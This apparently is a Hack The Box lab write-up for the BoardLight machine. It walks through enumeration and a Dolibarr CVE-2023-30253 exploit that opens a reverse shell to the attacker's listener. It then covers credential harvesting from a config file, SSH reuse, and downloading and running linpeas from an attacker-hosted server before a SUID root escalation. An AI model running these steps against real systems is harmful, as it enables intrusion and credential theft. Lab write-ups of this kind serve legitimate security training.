<h1>Enumeration</h1>
<p>We begin the enumeration of the victim machine by running a ping to the target IP 10.10.11.11 to check if the machine is active:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9d4b7303-ca0f-4a1e-9f72-f86a23caea0e" alt="Ping result">
</p>
<p>As we can see, the machine is active since it responds to the ping, and by the ttl=63, we can deduce that we are dealing with a Linux machine.</p>
<p>Now we will perform a simple scan with nmap to see which ports are open and which services are running on them:</p>

```bash
sudo nmap -p- -sV -sS --min-rate 5000 -n 10.10.11.11 -oN scan.txt
```

<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e3c448fb-1c9d-4ca8-b66f-7a5373852a0d" alt="Nmap scan results">
</p>
<p>We can see that ports 22 (SSH) and 80 (HTTP) are open and running an OpenSSH server and an Apache web server respectively, so we will try to access the Apache server through the browser:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/0f393783-6013-45c9-9e85-b03800732a86" alt="Apache server">
</p>
<p>As we can see, the server quickly resolves the request through the IP and we reach this destination page. Let's take a look to see if we find anything interesting...</p>
<p>Since it is a PHP-based website, we can try to exploit some type of LFI using a PHP wrapper from the site's URL. Specifically, if we send an empty form found in the footer of the page, we see that a request is made (<code>10.10.11.11/index.php?</code>), let's see if we can exploit it:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/a3d5eb64-457f-428d-be39-8eb23d05f860" alt="Empty form request">
</p>
<p>As we can see in the form request, no data is sent, and it simply reloads the same contact page:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/a3d5eb64-457f-428d-be39-8eb23d05f860" alt="Contact form response">
</p>
<p>Since we can't exploit an LFI or a potential SSRF, we will continue the enumeration process by fuzzing to find potentially vulnerable directories or subdomains. An interesting fact is that we find a contact email in the footer of the web page suggesting the existence of a domain <code>board.htb</code>.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e7b003d9-e67c-40d4-8d33-19698f4402eb" alt="Email contact">
</p>
<p>So we can add this domain to our <code>/etc/hosts</code> as if we test it in the browser, it directs us to the same web server.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/11714c8e-07da-4d02-a67f-3eb37fabba9c" alt="Adding domain to hosts">
</p>
<p>Now, let's proceed with fuzzing. We will use the ffuf tool and a SecList dictionary to see what we find:</p>

```bash
sudo ffuf -u http://FUZZ.board.htb -t 200 -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```

<p>This command with ffuf finds the subdomain <code>crm</code>, so <code>crm.board.htb</code> exists. Let's add it to the <code>/etc/hosts</code> and access it to see what it contains:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/18bc9fb8-748e-4183-82f4-0734f35eb6d8" alt="Subdomain crm">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/d69fa083-1a2a-417c-84f0-0ac22077311b" alt="CRM login page">
</p>
<p>In this subdomain, we can access a login page for the well-known customer relationship manager, Dolibarr, version 17.0.0.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/3b79efd3-dd75-45d2-b338-33ed3b440877" alt="Dolibarr login">
</p>
<p>If we search for some information on Google about this software and version, we can see that there is an associated vulnerability that allows us to exploit remote code execution (RCE) and grant us a reverse shell. The vulnerability is reported as CVE-2023-30253 and the GitHub repository found for this vulnerability, containing a Python script, is the following: <a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a>.</p>
<p>So, let's download and run the Python script to grant us a reverse shell as follows:</p>

```bash
# On our local machine:
nc -lvnp 9001
# On the victim machine:
python3 exploit.py http://crm.board.htb admin admin 10.10.14.28 9001
```

<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/2c3a47f3-58b0-4fa2-b995-993ec3ad8055" alt="Exploit execution">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/9892eec0-9b0e-4451-a8f0-0a0cb4f1e665" alt="Reverse shell">
</p>
<p>If inside the victim machine we move back a couple of directories looking for something interesting, we can stop at the path <code>/htbdocs</code>, and if we list the contents with <code>ls -la</code>, we can find a file <code>conf.php</code> that may be interesting for these types of servers since it usually contains users and credentials of some database being used.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/72d83f29-d067-4ec4-8e2d-c65de7956112" alt="Config directory">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/c5118307-7d72-42ac-a226-935d1a332bce" alt="Config file">
</p>
<p>And indeed, inside <code>config.php</code> we find access credentials for a MySQL database.</p>
<p>If we try to access the MySQL database, the system tells us that we do not have permission to access it as the <code>www-data</code> user, so we will need to find another way in.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/fad76804-5738-4fb6-a192-d1f51ec81984" alt="MySQL access denied">
</p>
<p>Going back to the <code>/home</code> directory, we find the directory of a system-level user named <code>larissa</code>, so we can try to log in via SSH with this user and the credential obtained in <code>conf.php</code> using the previous Python script.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-

BoardLight/assets/131161276/1f8a1f5d-d523-45a5-93f2-93128b843ca7" alt="SSH login">
</p>
<p>And once inside the <code>larissa</code> user, we can see the first flag, <code>user.txt</code>. Now let's go for the root flag.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/33b7cd4b-0fe7-413c-8622-544562ffdf1c" alt="User flag">
</p>
<p>Since we don't have any elevated permissions with this user, we will download the <code>linpeas.sh</code> script to perform a thorough scan for any vulnerabilities.</p>
<p>Download the script from: <a href="https://github.com/peass-ng/PEASS-ng/releases/tag/20240616-43d0a061">https://github.com/peass-ng/PEASS-ng/releases/tag/20240616-43d0a061</a></p>

# On our local machine:
python3 -m http.server 3333
# On the victim machine:
wget 10.10.14.101:3333/linpeas.sh

<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/dbf73b98-0b5b-4463-9fef-5f71d32425a2" alt="Downloading linpeas.sh">
</p>
<p>And finally, we give it permissions and execute it:</p>

chmod +x linpeas.sh
./linpeas.sh

<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/0611dbdb-e80f-4ac3-ab16-af3659aa08f9" alt="Linpeas execution">
</p>
<p>As we can see, the script reports several vulnerabilities. Specifically, if we go to the section of files with interesting permissions, we can find 4 files that indicate unknown SUID binaries, which we can exploit.</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/59237ecc-7b2e-4d66-af6f-dbb724e328ec" alt="Linpeas findings">
</p>
<p>Specifically, if we search for <code>enlightenment suid exploit</code>, there is a repository on GitHub, so let's download the exploit and try it:</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/e8202daf-eb53-4715-b933-9f1b30ba5df8" alt="Exploiting SUID">
</p>
<p>And finally, we have a terminal with the root user, we find the flag in <code>/root</code>, and we have completed BoardLight. Congratulations!</p>
<p align="center">
  <img src="https://github.com/alvaroogs013/WriteUp-HTB-BoardLight/assets/131161276/2d83e789-d114-4e3e-8bb7-fb4d713b81a7" alt="Root flag">
</p>
